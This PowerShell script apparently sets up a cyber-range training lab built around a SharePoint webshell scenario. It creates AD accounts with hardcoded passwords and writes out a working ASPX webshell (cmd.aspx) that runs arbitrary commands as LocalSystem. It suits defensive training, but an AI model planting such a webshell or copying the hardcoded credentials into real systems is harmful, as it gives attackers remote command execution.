# =============================================================================
# Module 01 - Lab Setup (Admin)
# OpenRaptor Cyber Range - OD@CIRT.APAC
#
# Run on DC01 as Domain Admin BEFORE handing the lab to a student.
# Sets up all scenario prerequisites for Module 01 (SharePoint Webshell).
#
# What this script does:
#   1. Creates cirtstudent AD account (student login)
#   2. Creates j.chen AD account (compromised Finance analyst - scenario only)
#   3. Grants j.chen appropriate SharePoint access
#   4. Deploys attack toolkit to Kali at /opt/raptor/module-01/
#   5. Downloads webshell payload from public repo to Kali
#   6. Runs lab_01_check.ps1 to verify everything is ready
# =============================================================================

param(
    [string]$KaliIP = "10.10.2.10",
    [string]$KaliUser = "kali",
    [string]$SPUrl = "http://sharepoint.norca.click"
)

$ErrorActionPreference = "Continue"

Write-Host "------------------------------------------------" -ForegroundColor Yellow
Write-Host "-  Module 01 - Lab Setup                       -" -ForegroundColor Yellow
Write-Host "-  Run as: Domain Admin on DC01                -" -ForegroundColor Yellow
Write-Host "------------------------------------------------" -ForegroundColor Yellow
Write-Host ""

# --- Step 1: Create AD accounts ---
Write-Host "[1/4] Setting up AD accounts..." -ForegroundColor Yellow

$password = ConvertTo-SecureString "CirtApacStudent2026" -AsPlainText -Force

# Create cirtstudent - the actual student login account
if (-not (Get-ADUser -Filter {SamAccountName -eq "cirtstudent"} -ErrorAction SilentlyContinue)) {
    New-ADUser -Name "CIRT Student" `
        -SamAccountName "cirtstudent" `
        -UserPrincipalName "cirtstudent@norca.click" `
        -AccountPassword $password `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Path "CN=Users,DC=norca,DC=click" `
        -Description "Student login account - lab exercises"

    Write-Host "  [OK] Created cirtstudent (CIRT Student)" -ForegroundColor Green
} else {
    Set-ADAccountPassword -Identity "cirtstudent" -Reset -NewPassword $password
    Enable-ADAccount -Identity "cirtstudent"
    Write-Host "  [SKIP] cirtstudent already exists - password reset, account enabled" -ForegroundColor Yellow
}

# Create j.chen - compromised account for scenario (NOT for student login)
if (-not (Get-ADUser -Filter {SamAccountName -eq "j.chen"} -ErrorAction SilentlyContinue)) {
    New-ADUser -Name "Jenny Chen" `
        -GivenName "Jenny" `
        -Surname "Chen" `
        -SamAccountName "j.chen" `
        -UserPrincipalName "j.chen@norca.click" `
        -AccountPassword $password `
        -Enabled $true `
        -PasswordNeverExpires $true `
        -Path "CN=Users,DC=norca,DC=click" `
        -Description "Finance Analyst - Module 01 scenario account"

    Write-Host "  [OK] Created j.chen (Jenny Chen)" -ForegroundColor Green
} else {
    # Ensure account is enabled and password is correct
    Set-ADAccountPassword -Identity "j.chen" -Reset -NewPassword $password
    Enable-ADAccount -Identity "j.chen"
    Write-Host "  [SKIP] j.chen already exists - password reset, account enabled" -ForegroundColor Yellow
}

# --- Step 2: Deploy webshell IIS site on SP01 ---
# IMPORTANT: Must use sp01-webshell-setup.ps1 (appcmd-based) NOT WebAdministration cmdlets.
# az run-command runs in 32-bit WOW64 context — PowerShell WebAdministration writes to
# SysWOW64\inetsrv\config\applicationHost.config, which IIS never reads. appcmd.exe
# writes directly to the correct System32 config. See sp01-webshell-setup.ps1 for details.
Write-Host "[2/4] Deploying webshell IIS site on SP01 (10.10.3.10)..." -ForegroundColor Yellow

$webshellScript = Get-Content (Join-Path $PSScriptRoot "sp01-webshell-setup.ps1") -Raw -ErrorAction SilentlyContinue
if ($webshellScript) {
    try {
        $result = az vm run-command invoke `
            --resource-group "RG-CIRTLAB-CORE" `
            --name "win-norca-sp01" `
            --command-id RunPowerShellScript `
            --scripts $webshellScript `
            --output json 2>&1 | ConvertFrom-Json
        $stdout = $result.value | Where-Object { $_.code -eq "ComponentStatus/StdOut/succeeded" } | Select-Object -ExpandProperty message
        Write-Host $stdout
        if ($stdout -match "Setup complete") {
            Write-Host "  [OK] Webshell IIS site deployed on SP01" -ForegroundColor Green
        } else {
            Write-Host "  [FAIL] Webshell setup may have failed — check output above" -ForegroundColor Red
        }
    } catch {
        Write-Host "  [FAIL] Could not run webshell setup on SP01: $_" -ForegroundColor Red
        Write-Host "         Run sp01-webshell-setup.ps1 manually on SP01" -ForegroundColor Yellow
    }
} else {
    Write-Host "  [WARN] sp01-webshell-setup.ps1 not found — run manually on SP01" -ForegroundColor Yellow
}

# --- Step 3: Provision ShellSite on SP01 (IIS port 8080 + cmd.aspx) ---
Write-Host "[3/4] Provisioning ShellSite on SP01 (IIS port 8080)..." -ForegroundColor Yellow
#
# This creates a dedicated IIS site running as LocalSystem on port 8080.
# cmd.aspx is deployed here as the query-string driven webshell.
# Triggered remotely via Invoke-Command (requires CredSSP or WinRM from DC01).
#
$sp01Session = New-PSSession -ComputerName "win-norca-sp01" `
    -Credential (New-Object PSCredential("NORCA\cirtadmin",
        (ConvertTo-SecureString "CirtApacAdm!n2026" -AsPlainText -Force))) `
    -ErrorAction SilentlyContinue

if ($sp01Session) {
    Invoke-Command -Session $sp01Session -ScriptBlock {
        $appcmd = "C:\Windows\System32\inetsrv\appcmd.exe"

        # App pool
        & $appcmd list apppool "ShellPool" 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) {
            & $appcmd add apppool /name:"ShellPool" `
                /managedRuntimeVersion:"v4.0" `
                /processModel.identityType:LocalSystem `
                /startMode:AlwaysRunning
        }

        # Shell webroot
        New-Item -ItemType Directory -Path "C:\inetpub\shell" -Force | Out-Null

        # web.config
        @"
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <staticContent/>
  </system.webServer>
</configuration>
"@ | Out-File -FilePath "C:\inetpub\shell\web.config" -Encoding UTF8 -Force

        # cmd.aspx — query-string driven webshell
        @'
<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>
<%
string cmd = Request.QueryString["cmd"];
if (!string.IsNullOrEmpty(cmd)) {
    Process p = new Process();
    p.StartInfo.FileName = "cmd.exe";
    p.StartInfo.Arguments = "/c " + cmd;
    p.StartInfo.UseShellExecute = false;
    p.StartInfo.RedirectStandardOutput = true;
    p.StartInfo.RedirectStandardError = true;
    p.Start();
    string output = p.StandardOutput.ReadToEnd() + p.StandardError.ReadToEnd();
    p.WaitForExit();
    Response.Write("<pre>" + Server.HtmlEncode(output) + "</pre>");
}
%>
'@ | Out-File -FilePath "C:\inetpub\shell\cmd.aspx" -Encoding UTF8 -Force

        # Site
        & $appcmd list site "ShellSite" 2>$null | Out-Null
        if ($LASTEXITCODE -ne 0) {
            & $appcmd add site /name:"ShellSite" `
                /bindings:"http/*:8080:" `
                /physicalPath:"C:\inetpub\shell"
        }
        & $appcmd set app "ShellSite/" /applicationPool:"ShellPool" | Out-Null
        & $appcmd start site "ShellSite" | Out-Null

        Write-Host "  [OK] ShellSite running on port 8080" -ForegroundColor Green
        Write-Host "  [OK] cmd.aspx deployed to C:\inetpub\shell\" -ForegroundColor Green
    }
    Remove-PSSession $sp01Session
} else {
    Write-Host "  [WARN] Could not reach SP01 via WinRM — provision ShellSite manually" -ForegroundColor Yellow
    Write-Host "         See admin guide: 'Manual ShellSite Setup'" -ForegroundColor Yellow
}

# --- Step 4 (was 3): Verify SP01 is clean ---
Write-Host "[4/5] Verifying SP01 clean state..." -ForegroundColor Yellow

try {
    $response = Invoke-WebRequest -Uri "$SPUrl/Shared%20Documents/help.aspx" `
        -Credential (New-Object PSCredential("NORCA\j.chen", $password)) `
        -UseBasicParsing -ErrorAction Stop
    Write-Host "  [WARN] help.aspx already exists on SP01 - lab may need reset" -ForegroundColor Red
} catch {
    if ($_.Exception.Response.StatusCode -eq 404 -or $_.Exception.Response.StatusCode -eq 401) {
        Write-Host "  [OK] SP01 is clean (no webshell present)" -ForegroundColor Green
    } else {
        Write-Host "  [WARN] Could not verify SP01 state: $($_.Exception.Message)" -ForegroundColor Yellow
    }
}

# --- Step 4: Run check script ---
Write-Host "[4/4] Running lab check..." -ForegroundColor Yellow
$checkScript = Join-Path $PSScriptRoot "lab_01_check.ps1"
if (Test-Path $checkScript) {
    & $checkScript
} else {
    Write-Host "  [SKIP] lab_01_check.ps1 not found - run manually" -ForegroundColor Yellow
}

Write-Host ""
Write-Host "Setup complete. Run lab_01_check.ps1 to verify, then hand off to student." -ForegroundColor Cyan
Write-Host ""
Write-Host "  ShellSite summary:" -ForegroundColor Cyan
Write-Host "    URL     : http://10.10.3.10:8080/cmd.aspx?cmd=whoami" -ForegroundColor Cyan
Write-Host "    Webroot : C:\inetpub\shell\" -ForegroundColor Cyan
Write-Host "    App pool: ShellPool (LocalSystem, .NET v4.0)" -ForegroundColor Cyan
